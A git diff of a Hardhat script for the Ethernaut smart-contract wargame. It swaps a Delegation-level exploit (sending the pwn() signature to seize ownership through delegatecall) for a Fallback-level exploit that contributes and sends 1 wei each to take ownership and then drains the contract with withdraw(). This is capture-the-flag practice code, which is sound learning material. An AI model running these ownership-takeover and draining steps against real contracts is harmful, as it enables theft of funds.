@@ -1,32 +1,34 @@
 const { ethers } = require("hardhat");
-const Runner = require("./lib/runner");
-const utils = require("./lib/utils");
+const Runner = require('./lib/runner')
 
 Runner.run(async (provider, owner) => {
     
-    //PLACE THE ETHERNAUT DELEGATION CONTRACT ADDRESS HERE (Ethernaut: contract.adddress)
-    const contractAddr = "0xd9290DE8a37481492DCE3eFc79f5d7Dc4817D919";     
+    //PLACE FALLBACK CONTRACT ADDRESS HERE (Ethernaut: contract.address)
+    const fallbackAddr = "0x5b50DFD5AE5af42E7F010f84e055Eb0AA10a27a9";
     
-    const contract = await ethers.getContractAt("Delegation", contractAddr);
+    const fallback = await ethers.getContractAt("Fallback", fallbackAddr);
     
-    console.log("* * * ");
-    console.log(`contract owner is ${await contract.owner()}`);
-    console.log(`delegate address is ${await provider.getStorageAt(contractAddr, 1)}`);
     
-    //send transaction with the call signature for pwn(). it will go to the delegate's 
-    // fallback, setting the owner of the calling contract 
-    console.log("calling fallback...");
+    //verify original owner 
+    console.log('* * * ');
+    console.log(`owner is ${await fallback.owner()}`);
     
-    //const callSig = new ethers.utils.Interface(["function pwn()"]).encodeFunctionData("pwn", []); 
-    const callSig = utils.encodeFunctionSignature("pwn");
+    //contribute 1 so that our contribution is recorded (is > 0 as per requirement) 
+    await fallback.contribute({value:1});
     
-    await owner.sendTransaction({
-        to: contractAddr,
-        from: owner.address, 
-        data: callSig,
-    });
+    //now pay 1 more into receive() function which has a different criteria for ownership 
+	await owner.sendTransaction({
+		to: fallback.address,
+		value: 1,
+	}); 
     
-    //verify the new owner 
-    console.log(`contract owner is ${await contract.owner()}`);
-    console.log("* * * ");
+    //now verify that we are owner, for the cost of only 2 wei :)
+    console.log(`owner is ${await fallback.owner()}`);
+    
+    //drain the balance 
+    await fallback.withdraw(); 
+    
+    //verify the balance 
+    console.log(`contract balance is ${await provider.getBalance(fallbackAddr)}`);
+    console.log('* * * ');
 });
